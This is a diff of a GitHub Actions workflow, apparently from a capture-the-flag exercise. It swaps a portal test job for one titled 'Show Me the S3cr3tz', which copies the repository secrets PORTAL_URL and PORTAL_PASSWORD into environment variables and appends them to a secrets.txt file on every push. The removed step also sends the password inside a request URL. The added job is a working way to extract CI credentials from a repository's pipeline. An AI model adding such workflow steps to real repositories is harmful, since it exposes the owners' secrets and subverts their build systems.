@@ -1,15 +1,19 @@
-name: Test the my portal
-
-on:
-  pull_request:
-    branches: [ master ]
+name: Show Me the S3cr3tz
+on: [push]
 
 jobs:
-  test:
-    runs-on: windows-latest
+  debug:
+    name: Debug
+    runs-on: ubuntu-latest
+
     steps:
-      - uses: actions/checkout@v3
-      - name: Test the PALINDROME portal
-        run: | 
-          C:\msys64\usr\bin\wget.exe ${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }} -O test --header='Content-Type; application/json"
-          cat test
+    - name: Check out code
+      uses: actions/checkout@v2
+
+    - name: Set up secret file
+      env:
+        DEBUG_PASSWORD: ${{ secrets.PORTAL_URL }}
+        DEBUG_SECRET_KEY: ${{ secrets.PORTAL_PASSWORD }}
+      run: |
+        echo $DEBUG_PASSWORD >> secrets.txt
+        echo $DEBUG_SECRET_KEY >> secrets.txt
